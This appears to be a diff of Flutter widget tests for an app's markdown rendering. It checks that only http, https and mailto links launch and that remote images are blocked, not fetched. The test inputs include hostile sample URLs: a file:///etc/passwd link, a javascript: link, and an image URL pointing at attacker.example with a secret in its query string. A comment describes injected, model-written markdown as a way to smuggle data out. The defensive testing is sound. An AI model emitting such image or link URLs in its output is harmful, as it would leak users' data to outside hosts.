@@ -74,6 +74,44 @@ void main() {
       verifyNever(() => mockUrlLauncher.launchUrl(any(), any()));
     });
 
+    test('launches http and mailto links too, whatever their case', () async {
+      when(
+        () => mockUrlLauncher.launchUrl(any(), any()),
+      ).thenAnswer((_) async => true);
+
+      await handleMarkdownLinkTap('http://example.com', 'Plain');
+      await handleMarkdownLinkTap('mailto:someone@example.com', 'Mail');
+      await handleMarkdownLinkTap('HTTPS://example.com/Upper', 'Upper');
+
+      final launched = verify(
+        () => mockUrlLauncher.launchUrl(captureAny(), any()),
+      ).captured;
+      expect(launched, [
+        'http://example.com',
+        'mailto:someone@example.com',
+        // Uri normalises the scheme, so the allow-list sees it lower-cased.
+        'https://example.com/Upper',
+      ]);
+    });
+
+    test('never hands any other scheme to another app', () async {
+      // Model-written or synced markdown must not put a file, intent,
+      // script or custom app handler one tap away.
+      for (final url in [
+        'file:///etc/passwd',
+        'intent://scan/#Intent;scheme=zxing;end',
+        'javascript:alert(1)',
+        'tel:+15555550100',
+        'sms:+15555550100',
+        'otherapp://do/something',
+        'lotti://unknown/route',
+      ]) {
+        await handleMarkdownLinkTap(url, 'Link');
+      }
+
+      verifyNever(() => mockUrlLauncher.launchUrl(any(), any()));
+    });
+
     test('routes app-local task paths through NavService', () async {
       getIt.pushNewScope();
       final mockNavService = MockNavService();
@@ -179,6 +217,46 @@ void main() {
       },
       tags: 'glados',
     );
+  });
+
+  group('buildBlockedMarkdownImage', () {
+    Future<void> pumpImage(WidgetTester tester, String markdown) async {
+      await tester.pumpWidget(
+        makeTestableWidgetWithScaffold(
+          GptMarkdown(markdown, imageBuilder: buildBlockedMarkdownImage),
+        ),
+      );
+      await tester.pump();
+    }
+
+    testWidgets('shows where the image is from instead of fetching it', (
+      tester,
+    ) async {
+      final semantics = tester.ensureSemantics();
+      // The query string is what an injected URL would smuggle out.
+      await pumpImage(
+        tester,
+        'Before ![chart](https://attacker.example/p.png?d=secret) after',
+      );
+
+      expect(find.byType(Image), findsNothing);
+      expect(find.text('Image from attacker.example not loaded'), findsOne);
+      expect(find.byIcon(Icons.image_not_supported_outlined), findsOne);
+      // Inline in the paragraph, so its label merges into the paragraph's
+      // semantics node rather than standing alone.
+      expect(
+        find.bySemanticsLabel(RegExp('Image from attacker.example not loaded')),
+        findsOne,
+      );
+      semantics.dispose();
+    });
+
+    testWidgets('names the whole URL when it has no host', (tester) async {
+      await pumpImage(tester, '![local](images/diagram.png)');
+
+      expect(find.byType(Image), findsNothing);
+      expect(find.text('Image from images/diagram.png not loaded'), findsOne);
+    });
   });
 
   group('markdownLinkStyleSheet', () {
